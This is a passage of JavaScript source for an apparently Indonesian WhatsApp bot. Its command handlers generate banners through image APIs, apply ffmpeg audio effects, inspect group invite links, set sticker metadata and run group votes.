                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'banneroffreefire': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|misha`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|misha`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|misha`)
                const style = ['andrew', 'caroline', 'kelly', 'laura', 'maxim', 'miguel', 'misha', 'moco', 'nikita', 'notora', 'olivia', 'steffi']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'attp': {
            if (isBan) return reply(mess.ban)
            if (!text) return reply(`Tᴇᴋsɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ : ${prefix + command} TᴇsᴛGᴀɴᴛᴇɴɢ*`)
            tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
            await tganz.sendMedia(m.chat, `https://api.lolhuman.xyz/api/attp2?apikey=${lolkeysapi}&text=${text}`, 'tganz', '2023', m, {asSticker: true})
            }
            break
            case 'ttp': {
            if (isBan) return reply(mess.ban)
            if (!text) return reply(`Tᴇᴋsɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ : ${prefix + command} TᴇsᴛGᴀɴᴛᴇɴɢ*`)
            tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
            await tganz.sendMedia(m.chat, `https://api.lolhuman.xyz/api/ttp?apikey=${lolkeysapi}&text=${text}`, 'tganz', '2023', m, {asSticker: true})
            }
            break
            case 'neon': {
               if (!text) return reply(`*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} TᴇsᴛGᴀɴᴛᴇɴɢ *`)
                m.reply(mess.wait)
                tganz.sendMessage(m.chat, { image: { url: `https://api.zahwazein.xyz/ephoto/neonbp?text=${text}&apikey=${zenzkeyss}` }, caption: mess.done }, { quoted: m })
            }
            break
            case 'letterlogos': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|z`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|z`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|thumb\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|z`)
                const style = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'z']
                if (!style.includes(m3)) {
                    getStyle(style.length, "thumb")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        thumb: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'nightcore': {
            if (isBan) return reply(mess.ban)
            let set
            if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
            if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'mix':
            case 'remix': {
            if (isBan) return reply(mess.ban)
                let set
                if (/remix/.test(command)) set = '-filter:a atempo=0.94,asetrate=75000*0.94,equalizer=frequency=10:width_type=o:width=1:gain=6:mix=1'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'bass': {
            if (isBan) return reply(mess.ban)
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'blown': {
            if (isBan) return reply(mess.ban)
                let set
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'deep': {
            if (isBan) return reply(mess.ban)
                let set
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'earrape': {
            if (isBan) return reply(mess.ban)
                let set
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'fast': {
            if (isBan) return reply(mess.ban)
                let set
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'fat': {
            if (isBan) return reply(mess.ban)
                let set
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'laki-laki': {
            if (isBan) return reply(mess.ban)
                let set
                if (/laki-laki/.test(command)) set = '-filter:a atempo=1.336,asetrate=51500*0.66'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'perempuan': {
            if (isBan) return reply(mess.ban)
                let set
                if (/perempuan/.test(command)) set = '-filter:a atempo=0.96,asetrate=52600*0.85'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'reverse': {
            if (isBan) return reply(mess.ban)
                let set
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'robot': {
            if (isBan) return reply(mess.ban)
                let set
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'slow': {
            if (isBan) return reply(mess.ban)
                let set
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'smooth': {
            if (isBan) return reply(mess.ban)
                let set
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
            case 'tupai': {
            if (isBan) return reply(mess.ban)
                let set
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await tganz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.aac')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                tganz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/aac', ptt: true }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Rᴇᴘʟʏ/Bᴀʟᴀs ᴀᴜᴅɪᴏ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴜʙᴀʜ ᴋᴇᴄᴇᴘᴀᴛᴀɴɴʏᴀ !\n*Cᴏɴᴛᴏʜ : ${prefix + command} + Rᴇᴘʟʏ Aᴜᴅɪᴏɴʏᴀ*`)
                } 
                break
                case 'inspect': 
                case 'inspectgclink': 
                case 'inspectgrouplink': {
                if (isBan) return reply(mess.ban)
if (!q) return reply("Lɪɴᴋɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?")
reply(mess.wait)
let linkRegex = /chat\.whatsapp\.com\/(?:invite\/)?([0-9A-Za-z]{20,24})/i
        let [, code] = text.match(linkRegex) || {}
        if (!code) return m.reply("Lɪɴᴋ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴀᴛᴀᴜ ɢʀᴜᴘ ʏᴀɴɢ ᴋᴀᴋᴀᴋ sᴇʙᴜᴛ sᴜᴅᴀʜ ɢᴀɴᴛɪ ʟɪɴᴋ ᴛᴇʀʙᴀʀᴜ. Sɪʟᴀʜᴋᴀɴ ᴄᴏʙᴀ ʟɪɴᴋ ɢʀᴜᴘ ʟᴀɪɴ !")
        let res = await tganz.groupAcceptInvite(code)
        if (!res) return m.reply(String(res))
      try {
        let teks = `
    「 Group Link Inspector 」

⬡ *ID :* ${res.id}
⬡ *Subject :* ${res.subject}
⬡ *Subject Update By :* @${res.subjectOwner.split("@")[0]}
⬡ *Subject Update At :* ${moment(res.subjectTime * 1000).tz(global.timezone).format("DD-MM-YYYY, HH:MM:SS")}
⬡ *Creator :* @${res.owner ? res.owner.split("@")[0] : res.id.split("-")[0]}
⬡ *Create At :* ${moment(res.creation * 1000).tz(global.timezone).format("DD-MM-YYYY, HH:MM:SS")}
⬡ *Members Length :* ${res.size}
⬡ *Desc Update By :* ${res.descOwner ? "@" + res.descOwner.split("@")[0] : ""}
⬡ *Desc Update At :* ${moment(res.descTime * 1000).tz(global.timezone).format("DD-MM-YYYY, HH:MM:SS")}
⬡ *Desc ID :* ${res.descId}
⬡ *Description :*\n${res.desc ? res.desc : "No Description"}
⬡ *Friends Who Are Known to Join :*\n${res.participants ? res.participants.map((user, i) => ++i + ". @" + user.jid.split("@")[0]).join("\n").trim() : "Not Found"}
        `
        let pp
            pp = await tganz.profilePictureUrl(res.id, "image")
        } catch {
            pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
        }
        tganz.sendFile(m.from, pp, "", m, { caption: teks, mentions: await tganz.parseMention(teks) })
    }
        break
            case 'bannerofoverwatch': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|reinhardt`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|reinhardt`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                var m3 = mon.split("|")[2]
                if (!m3) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ|reinhardt`)
                const style = ['widowmaker', 'tracer', 'symmetra', 'sombra', 'soldier76', 'reinhardt', 'reaper', 'orisa', 'mercy', 'mei', 'genji', 'dva', 'doomfist', 'ashe', 'ana']
                if (!style.includes(m3)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        text2: m2,
                        background: m3
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'setexif': {
         if (isBan) return reply(mess.ban)
         if (!isCreator) return reply(mess.owner)
         if (!text) return reply(`Mᴀᴜ ᴅɪ ɢᴀɴᴛɪ ᴀᴘᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Pᴀᴄᴋɴᴀᴍᴇ|Aᴜᴛʜᴏʀ*`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`⫹⫺ Pᴀᴄᴋɴᴀᴍᴇ ᴅᴀɴ Aᴜᴛʜᴏʀ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴜʙᴀʜ ᴍᴇɴᴊᴀᴅɪ :\n*❑ Pᴀᴄᴋɴᴀᴍᴇ :* ${global.packname}\n *❑ Aᴜᴛʜᴏʀ :* ${global.author}\n\n*⫹⫺ Pᴇɴɢᴜʙᴀʜᴀɴ ɪɴɪ ʙᴇʀʟᴀᴋᴜ ᴜɴᴛᴜᴋ ᴘᴇᴍʙᴜᴀᴛᴀɴ sᴇᴍᴜᴀ sᴛɪᴄᴋᴇʀ !!!*`)
            }
            break
            case 'deletevote': case'delvote': case 'hapusvote': {
            if (isBan) return reply(mess.ban)
            if (!m.isGroup) return reply(mess.group)
            if (!(m.chat in vote)) return reply(`Tɪᴅᴀᴋ ᴀᴅᴀ ᴠᴏᴛᴇ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!\n\n*◈ Kᴇᴛɪᴋ : ${prefix}ᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴠᴏᴛᴇ*`)
            delete vote[m.chat]
            m.reply('Bᴇʀʜᴀsɪʟ ᴍᴇɴɢʜᴀᴘᴜs sᴇsɪ ᴠᴏᴛᴇ ᴅɪ ɢʀᴜᴘ ɪɴɪ !')
	    }
       break
            case 'vote': {
            if (isBan) return reply(mess.ban)
            if (!m.isGroup) return reply(mess.group)
            if (m.chat in vote) return reply(`Mᴀsɪʜ ᴀᴅᴀ ᴠᴏᴛᴇ ᴅɪ ɢʀᴜᴘ ɪɴɪ !!!\n\n*◈ Kᴇᴛɪᴋ : ${prefix}ʜᴀᴘᴜsᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴀᴘᴜs ᴠᴏᴛᴇ*`)
            if (!text) return reply(`⫹⫺ Mᴀsᴜᴋᴀɴ ᴀʟᴀsᴀɴ ᴋᴀᴍᴜ ɪɴɢɪɴ ᴠᴏᴛᴇ ᴅɪ ɢʀᴜᴘ ɪɴɪ :\n*☞ Cᴏɴᴛᴏʜ : ${prefix + command} TᴇsᴛGᴀɴᴢ Tᴇʀʟᴀʟᴜ OP*`)
            m.reply(`Vᴏᴛᴇ sᴜᴅᴀʜ ᴅɪᴍᴜʟᴀɪ !\n\n*◈ Kᴇᴛɪᴋ : ${prefix}ᴜᴘᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ʏᴀ*\n*◈ Kᴇᴛɪᴋ : ${prefix}ᴅᴇᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴛɪᴅᴀᴋ*\n*◈ Kᴇᴛɪᴋ : ${prefix}ᴄᴇᴋᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴍᴇɴɢᴇᴄᴇᴋ ᴠᴏᴛᴇ*\n*◈ Kᴇᴛɪᴋ : ${prefix}ʜᴀᴘᴜsᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴀᴘᴜs ᴠᴏᴛᴇ*`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*⫹⫺ Aʟᴀsᴀɴ :* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Tᴏᴛᴀʟ: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Tᴏᴛᴀʟ: ${vote[m.chat][2].length}
│
│ 
└────

*❑ Uᴘᴠᴏᴛᴇ = Sᴇᴛᴜᴊᴜ*
*❑ Dᴇᴠᴏᴛᴇ = Tɪᴅᴀᴋ Sᴇᴛᴜᴊᴜ*

*◈ Kᴇᴛɪᴋ : #ʜᴀᴘᴜsᴠᴏᴛᴇ - ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴀᴘᴜs ᴠᴏᴛᴇ*`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '👆🏻 UPVOTE'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE 👇🏻'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: footer_text,
                buttons: buttonsVote,
                headerType: 1
            }
            tganz.sendMessage(m.chat, buttonMessageVote)
	    }
        break
               case 'upvote': {
               if (isBan) return reply(mess.ban)
